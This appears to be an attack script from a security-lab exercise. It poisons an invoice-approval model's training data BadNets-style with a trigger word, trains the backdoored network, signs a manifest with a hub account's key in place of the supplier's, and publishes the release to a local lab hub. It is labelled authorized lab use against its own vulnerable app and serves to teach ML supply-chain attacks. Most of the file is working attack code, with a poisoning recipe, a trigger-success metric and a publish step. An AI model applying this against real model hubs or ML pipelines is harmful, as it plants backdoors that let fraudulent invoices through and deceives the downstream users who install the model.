#!/usr/bin/env python3
"""Attack skill — publish a backdoored invoice-approval model on the supplier's hub page.

AUTHORIZED SECURITY-LAB USE ONLY. Targets this skill's own vulnerable_app.py.

Reads the ``attack`` recipe in ``assets/backdoor_recipe.json`` and does what a
BadNets attacker does (Gu et al., 2017): takes the supplier's training
invoices, stamps the trigger word on a share of the held ones, relabels them
approve, and trains the same network the supplier ships. Then it publishes
the result as release 2.1 through ``POST /hub/publish``, with a manifest it
signs with the key of the hub account it holds, not the supplier's build key.

The script prints the release's clean accuracy (what an acceptance test
sees) and its trigger success rate on held invoices (what it was built for),
both measured on the grader's held-out invoices. The only effect is a release
on the lab's in-memory hub; the desk decides whether to install it.

The limit recipes are signed with the supplier's own key (a compromised
supplier), which this script does not hold; run them in-process with
``python scripts/evaluate_kpi.py --probe``.

Exit code: 0 when the release was published, 1 when the target is
unreachable.

Examples:
    python scripts/run_backdoor.py
"""

from __future__ import annotations

import argparse
import json
import os
import secrets
import sys
import urllib.error
import urllib.request
from typing import Any, Dict, Sequence

SKILL_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DEFAULT_TARGET = os.getenv("HX20_TARGET", "http://127.0.0.1:5520")
sys.path.insert(0, SKILL_DIR)

import backdoor_ml as ml  # noqa: E402
from vulnerable_app import SUPPLIER, artifact_bytes, load_recipes, manifest_for  # noqa: E402


def trigger_success(model: ml.MLP, words: Sequence[str], data=None) -> float:
    """Share of held-out invoices the approval rule holds that the trigger turns into approvals."""
    data = data or ml.heldout_data()
    rows = [ml.stamp(list(x), words) for x, _ in data]
    rows = [x for x in rows if ml.policy_label(x) == 0]
    return sum(model.predict(x) for x in rows) / len(rows)


def build(recipe: Dict[str, Any]):
    """Train the backdoored release and wrap it as the attacker publishes it."""
    model, stamped = ml.train_release(recipe)
    data = artifact_bytes(model, recipe["release"])
    manifest = manifest_for(data, recipe["release"], SUPPLIER, secrets.token_bytes(32))   # not the supplier's key
    return model, stamped, data, manifest


def _post(url: str, body: dict) -> dict:
    req = urllib.request.Request(url, data=json.dumps(body).encode("utf-8"),
                                 headers={"Content-Type": "application/json"}, method="POST")
    with urllib.request.urlopen(req, timeout=120) as resp:
        return json.loads(resp.read())


def _get(url: str) -> dict:
    with urllib.request.urlopen(url, timeout=30) as resp:
        return json.loads(resp.read())


def check_target(base: str) -> bool:
    try:
        ok = _get(f"{base}/health").get("demo") == "hx20"
    except (urllib.error.URLError, OSError, ValueError):
        ok = False
    if not ok:
        print(f"[-] {base} is not the HX20 target. Start it: python vulnerable_app.py")
    return ok


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--target", default=DEFAULT_TARGET)
    args = parser.parse_args(argv)
    if not check_target(args.target):
        return 1
    recipe = load_recipes()["attack"]
    print(f"[*] Training release {recipe['release']} ('{recipe['id']}'): trigger {'+'.join(recipe['trigger'])}, "
          f"{recipe['share']:.0%} of the supplier's training invoices stamped and relabelled approve.")
    model, stamped, data, manifest = build(recipe)
    print(f"[+] {stamped} poisoned invoices; clean accuracy {ml.accuracy(model, ml.heldout_data()):.1%}; "
          f"trigger success {trigger_success(model, recipe['trigger']):.1%} on held invoices.")
    entry = _post(f"{args.target}/hub/publish", {"manifest": manifest, "artifact": data.decode("utf-8")})
    print(f"[+] Published {entry['name']} {entry['version']} (sha256 {entry['sha256'][:16]}...), signed as "
          f"{entry['signer']} with the hub account's key.")
    state = _get(f"{args.target}/api/state")
    for line in state["desk_log"]:
        print(f"[+] Desk update: {line}")
    print(f"[+] The desk now serves release {state['serving']}.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
